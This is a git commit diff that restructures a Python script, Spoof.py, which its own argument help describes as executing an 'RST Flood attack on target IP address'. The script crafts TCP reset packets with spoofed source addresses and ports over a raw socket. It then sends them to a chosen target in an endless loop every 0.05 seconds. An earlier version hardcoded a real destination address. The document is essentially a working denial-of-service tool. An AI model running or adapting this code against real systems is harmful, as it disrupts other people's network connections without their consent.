2086401963fe6540ec3cf7ca050109861541b96e
Jeffreychen99 <jeffrey_chen99@berkeley.edu>
2020-07-24 12:15:48 -0700

    Restructure and arguments adding

--- raw/Spoof.py
+++ raw/Spoof.py
@@ -1,58 +1,61 @@
-import requests
+import argparse
 import socket
 import sys
+import time
 from struct import *
 
 from IP_Header import IP_Header
 from TCP_Header import TCP_Header
 
-selfIP = ""
-try:
-	selfIP = requests.get(url="https://ifconfig.me").text
-except:
-	print("Could not connect to https://ifconfig.me")
+def parseArgs():
+	parser = argparse.ArgumentParser(description="Execute RST Flood attack on target IP address")
+	parser.add_argument("src_ip", type=str, help="Source IP address")
+	parser.add_argument("dst_ip", type=str, help="Destination IP address")
+	parser.add_argument("src_port", type=int, help="Source IP port")
+	parser.add_argument("dst_port", type=int, help="Destination IP port")
 
-s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+	return parser.parse_args()
 
-payload = '12345'
 
-#source_ip = selfIP
-source_ip = '192.168.5.140'
-#source_ip = '10.31.25.237'
-#dest_ip = socket.gethostbyname('www.google.com')
-dest_ip = '172.217.6.164'
-ip_head = IP_Header(source_ip, dest_ip)
-ip_header = ip_head.assemble()
+def print_packet(packet):
+	for i in range(len(packet)):
+		if i % 4 == 0:
+			print()
+		if i == 20 or i == 40:
+			print()
+		hexstring = '0x' + hex(packet[i])[2:].zfill(2)
+		print(hexstring, end="\\")
+	print("\n")
 
-source_port = 80
-dest_port = 443
-tcp_head = TCP_Header(source_ip, dest_ip, source_port, dest_port)
-tcp_head.create_flags(rst=1)
-tcp_header = tcp_head.assemble(payload)
+def spoof(sock, src_ip, src_port, dst_ip, dst_port, payload):
+	ip_head = IP_Header(src_ip, dst_ip)
+	ip_header = ip_head.assemble()
+	
+	tcp_head = TCP_Header(src_ip, dst_ip, src_port, dst_port)
+	tcp_head.create_flags(rst=1)
+	tcp_header = tcp_head.assemble(payload)
 
-# if using socket.IPPROTO_TCP, you can't use ip_header because it gets auto-added
-packet = tcp_header + bytearray(payload, 'utf-8')
-#packet = ip_header + tcp_header + bytearray(payload, 'utf-8')
+	# if using socket.IPPROTO_TCP, you can't use ip_header because it gets auto-added
+	packet = tcp_header + bytearray(payload, 'utf-8')
+	#packet = ip_header + tcp_header + bytearray(payload, 'utf-8')
 
-# AS IT IS NOW, CAN'T SEND WITH SPOOFED IP, NEED TO IMPLEMENT IP HEADER TO DO THIS
+	print_packet(packet)
 
-for i in range(len(packet)):
-	if i % 4 == 0:
-		print()
-	if i == 20 or i == 40:
-		print()
-	hexstring = '0x' + hex(packet[i])[2:].zfill(2)
-	print(hexstring, end="\\")
-print("\n")
+	print("SOURCE IP:      " + src_ip)
+	print("DESTINATION IP: " + dst_ip)
 
-print("SOURCE IP:      " + source_ip)
-print("DESTINATION IP: " + dest_ip)
+	while True:
+		sock.sendto(packet, (dst_ip, 0))
+		time.sleep(0.05)
 
-import time
-while True:
-	s.sendto(packet, (dest_ip, 0))
-	time.sleep(0.05)
 
+if __name__ == "__main__":
+	args = parseArgs()
+
+	sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+
+	payload = "12345"
+	spoof(sock, args.src_ip, args.src_port, args.dst_ip, args.dst_port, payload)
 
 
 
